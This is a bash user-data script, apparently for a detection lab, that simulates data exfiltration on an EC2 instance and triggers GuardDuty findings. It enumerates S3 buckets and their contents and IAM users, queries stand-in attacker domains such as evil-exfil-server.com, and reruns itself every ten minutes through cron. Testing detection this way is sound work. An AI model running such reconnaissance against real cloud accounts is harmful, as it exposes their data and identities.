#!/bin/bash
# Data Exfiltration Attack Simulation - REAL attack on EC2

yum install -y amazon-cloudwatch-agent aws-cli

# Configure CloudWatch Logs
cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/attack-simulation.log",
            "log_group_name": "/aws/ec2/attack-simulations",
            "log_stream_name": "data-exfiltration-{instance_id}"
          }
        ]
      }
    }
  }
}
EOF

/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config -m ec2 -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json

cat > /root/data-exfil-attack.sh <<'ATTACK'
#!/bin/bash
LOG="/var/log/attack-simulation.log"

echo "$(date) - Starting Data Exfiltration Attack" | tee -a $LOG

# 1. List all S3 buckets (reconnaissance)
echo "$(date) - Enumerating S3 buckets" | tee -a $LOG
aws s3 ls 2>&1 | tee -a $LOG

# 2. Attempt to download data from buckets
echo "$(date) - Attempting to access bucket contents" | tee -a $LOG
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "$(date) - Accessing bucket: $bucket" | tee -a $LOG
  aws s3 ls s3://$bucket --recursive 2>&1 | head -20 | tee -a $LOG
done

# 3. Large data transfer simulation (triggers GuardDuty: Exfiltration:S3/ObjectRead.Unusual)
echo "$(date) - Simulating large data download" | tee -a $LOG
dd if=/dev/urandom of=/tmp/sensitive-data.bin bs=1M count=100
echo "$(date) - Created 100MB of 'sensitive' data" | tee -a $LOG

# 4. Exfiltrate to external location (DNS queries to suspicious domains)
echo "$(date) - Attempting data exfiltration" | tee -a $LOG
for domain in evil-exfil-server.com attacker-c2.net data-dump.xyz; do
  nslookup $domain 2>&1 | tee -a $LOG || true
done

# 5. Unusual API calls
echo "$(date) - Making unusual API calls" | tee -a $LOG
aws iam list-users 2>&1 | tee -a $LOG
aws ec2 describe-instances 2>&1 | tee -a $LOG
aws cloudtrail describe-trails 2>&1 | tee -a $LOG

echo "$(date) - Data exfiltration attack complete" | tee -a $LOG
echo "$(date) - Expected GuardDuty findings: Exfiltration:S3/ObjectRead.Unusual, UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration" | tee -a $LOG
ATTACK

chmod +x /root/data-exfil-attack.sh
echo "*/10 * * * * /root/data-exfil-attack.sh" | crontab -
/root/data-exfil-attack.sh &
